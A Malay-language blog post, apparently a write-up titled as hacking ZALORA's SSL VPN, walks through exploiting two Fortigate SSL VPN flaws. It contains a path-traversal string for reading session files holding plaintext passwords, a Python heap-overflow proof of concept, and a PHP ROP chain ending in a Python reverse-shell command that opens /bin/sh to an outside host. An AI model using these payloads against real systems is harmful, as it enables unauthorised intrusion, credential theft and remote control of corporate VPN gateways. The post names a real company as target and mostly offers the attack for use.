---
title: "Hacking ZALORA SSL VPN - Part 2: Exploit The Vulnerabilities"
date: 2021-04-04
layout: single
permalink: /infosec/hacking-zalora-ssl-vpn-part-2-exploit-the-vulnerabilities/
tags: [Hacking , Infomation Security ]
---

## Fortigate SSL VPN

Fortinet memperkenalkan rangkaian produk SSL VPN mereka sebagai Fortigate SSL VPN, yang lazimnya digunakan oleh perusahaan (enterprise) bersaiz sederhana.Terdapat lebih dari 480,000 pelayan yang beroperasi dalam internet dan "common" di rantau Asia dan juga Eropah.Kita boleh mengenal pastinya dengan menggunakan URL */remote/login* .Ciri-ciri teknikal yang ada pada Fortigate SSL VPN :

- All-in-one binary

Kita mulakan penyelidikan kita dengan menyelongkar *file system*.Dalam */bin/*, kita mendapati bahawa kesemua fail didalamnya adalah *symbolic links* yang menyasarkan kepada */bin/init*.

![enter image description here](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/images/binary.png){: .align-center}

Fortigate *compile* semua program dan konfigurasi dalam satu binari tungal (single binary), iaitu */bin/init*.Disebabkan itu, saiz *init* tersangatlah besar mencecah 500 MB dan mengandungi beribu *function* dan tiada satu pun *symbol*.Ianya hanya mengandungi program yang diperlukan untuk SSL VPN.Oleh itu, persekitarannya (environment) sangat merumitkan bagi penggodam untuk menganalisisnya bahkan tiada */bin/ls* dan juga */bin/cat*.

- Web daemon

Terdapat 2 *web interfaces* yang berjalan (running) dalam Fortigate SSL VPN.Salah satu daripadanya adalah untuk *admin interface*, yang dikendalikan oleh */bin/httpsd* pada *port* 443.Manakala yang selebihnya untuk *normal user interface*, yang dikendalikan oleh */bin/sslvpnd* pada *port* 4433.Kebiasaannya *admin page* disekat daripada pandangan internet.Jadi, kita hanya boleh akses *user interface*.

Pelayan Web itu telah diubah suai daripada *apache* yang asal 2002 dan mereka menambah fungsi tambahan mereka sendiri.Kita boleh memetakan kod sumber (source code) *apache* bagi mempercepatkan proses analisis kita.

Dalam kedua-dua *web sevice* itu, mereka juga *compile* modul *apache* yang mereka bina ke dalam *binary file* bagi mengendalikan setiap jalur URL (URL path).

- WebVPN

## Vulnerabilities

- PreAuth Arbitrary File Reading

Ketika ia *fetching language file* yang sepadan, ia membina *json file path* dengan parameter *lang* :

```bash
snprintf(s, 0x40, "/migadmin/lang/%s.json", lang);
```

Tiada perlindungan (protection), tetapi *file extension* bertambah secara automatik.Kita hanya boleh membaca fail *json*.Namun, kita boleh *abuse* ciri *snprintf* ini.Menurut laman *man*, ianya 	*writes at most size-1* pada *output string*.Oleh itu, kita hanya perlu "overflow" *buffer size* dan kemudiannya *.json* extension akan "stripped" dan seterusnya membolehkan kita untuk membaca apa sahaja fail yang kita kehendaki.

- PreAuth Heap Overflow

Ketika mengekodkan kod entiti HTML, terdapat 2 peringkat.Pelayan terlebih dahulu mengira (calculate) panjang *buffer* yang diperlukan untuk *encoded string*.Kemudian ia dikod ke dalam *buffer*.Pada peringkat pengiraan, sebagai contoh, *encode string* bagi `<` adalah `&#60;` dan ini harus menepati 5 *bytes*.Sekiranya ia bertemu dengan sesuatu yang bermula dengan `&#` seperti `&#60;` , ia akan menganggap bahawa ada *token* yang sudah dikodkan dan menghitung panjangnya secara terus seperti ini :

```bash
c = token[idx];
if (c == '(' || c == ')' || c == '#' || c == '<' || c == '>')
    cnt += 5;
else if(c == '&' && html[idx+1] == '#')
    cnt += len(strchr(html[idx], ';')-idx);
```

Walau bagaimanapun, terdapat percanggahan antara pengiraan panjang dan proses pengekodan.

```bash
switch (c)
{
    case '<':
        memcpy(buf[counter], "&#60;", 5);
        counter += 4;
        break;
    case '>':
    // ...
    default:
        buf[counter] = c;
        break;
    counter++;
}
```

Jika kita meletakkan *malicious string* seperti `&#<<<;` ,	`<` masih lagi dikodkan pada `&#60;` dan hasilnya menjadi `&#&#60;&#60;&#60;;`.Ini jauh lebih besar daripada 6 *bytes* dan ini akan menyebabkan *heap overflow*.

Proof of Concept :

```python
import requests

data = {
    'title': 'x', 
    'msg': '&#' + '<'*(0x20000) + ';<', 
}
r = requests.post('https://sslvpn:4433/message', data=data)
```

## Exploitation

- PreAuth Arbitrary File Reading

Jika kita *stripped* atau "remove" *.json* extension, kita boleh "read" apa sahaja fail yang kita mahukan.

```
/migadmin/lang//../../../..//////////////////////////////bin/sh
```

Seterusnya kita pergi ke */dev/cmdb/sslvpn\_websession*.Didalamnya terdapat :

- Session token
- IP address
- Username
- **Plaintext password**

Fokus pada *plaintext password*, kita sudah memiliki *username* dan juga *password*, jadi apa yang kita perlu lakukan seterusnya? Sudah semestinya kita boleh *login* secara terus.Setelah kita *login*, kita boleh meminta SSL VPN supaya *proxy the exploit* ke pelayan HTTP kita, dan kemudian "trigger" *heap overflow*.

- PreAuth Heap Overflow

Kita tidak dapat mengawal *heap* itu, tetapi secara tidak sengaja kita menjumpai sesuatu yang kerap kali muncul.KIta seterusnya "fuzz" pelayan itu untuk mendapatkan sesuatu maklumat yang berguna untuk kita.Kita mendapati program itu "crash" dan kita hampir mengawal *program counter*.

```bash
Program received signal SIGSEGV, Segmentation fault.
0x00007fb908d12a77 in SSL_do_handshake () from /fortidev4-x86_64/lib/libssl.so.1.1
2: /x $rax = 0x41414141
1: x/i $pc
=> 0x7fb908d12a77 <SSL_do_handshake+23>: callq *0x60(%rax)
(gdb)
```

"Crash" itu berlaku pada *SSL_do_handshake()* :

```c
int SSL_do_handshake(SSL *s)
{
    // ...

    s->method->ssl_renegotiate_check(s, 0);

    if (SSL_in_init(s) || SSL_in_before(s)) {
        if ((s->mode & SSL_MODE_ASYNC) && ASYNC_get_current_job() == NULL) {
            struct ssl_async_args args;

            args.s = s;

            ret = ssl_start_async_job(s, &args, ssl_do_handshake_intern);
        } else {
            ret = s->handshake_func(s);
        }
    }
    return ret;
}
```

Jadi, kita *overwrite function table* dalam *struct SSL* yang dikenali sebagai *method* dan apabila program itu cuba untuk "execute" `s->method->ssl_renegotiate_check(s, 0);` , ia akan "crash".Kita tujukan *SSL structure* dengan lambakan *normal request* kepada *heap* dan kemudiannya *overflow*  SSL structure itu.

![enter image description here](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/images/ssl-structure.png){: .align-center}

Proof of Concept

```php
<?php
    function p64($address) {
        $low = $address & 0xffffffff;
        $high = $address >> 32 & 0xffffffff;
        return pack("II", $low, $high);
    }
    $junk = 0x4141414141414141;
    $nop_func = 0x32FC078;

    $gadget  = p64($junk);
    $gadget .= p64($nop_func - 0x60);
    $gadget .= p64($junk);
    $gadget .= p64(0x110FA1A); // # start here # pop r13 ; pop r14 ; pop rbp ; ret ;
    $gadget .= p64($junk);
    $gadget .= p64($junk);
    $gadget .= p64(0x110fa15); // push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;
    $gadget .= p64(0x1bed1f6); // pop rax ; ret ;
    $gadget .= p64(0x58);
    $gadget .= p64(0x04410f6); // add rdi, rax ; mov eax, dword [rdi] ; ret  ;
    $gadget .= p64(0x1366639); // call system ;
    $gadget .= "python -c 'import socket,sys,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],12345));[os.dup2(s.fileno(),x) for x in range(3)];os.system(sys.argv[2]);' xx.xxx.xx.xx /bin/sh;";

    $p  = str_repeat('AAAAAAAA', 1024+512-4); // offset
    $p .= $gadget;
    $p .= str_repeat('A', 0x1000 - strlen($gadget));
    $p .= $gadget;
?>
<a href="javascript:void(0);<?=$p;?>">xxx</a>
```

Dan kemudian kita akan dapat *reverse shell* !

### HAPPY HACKING !
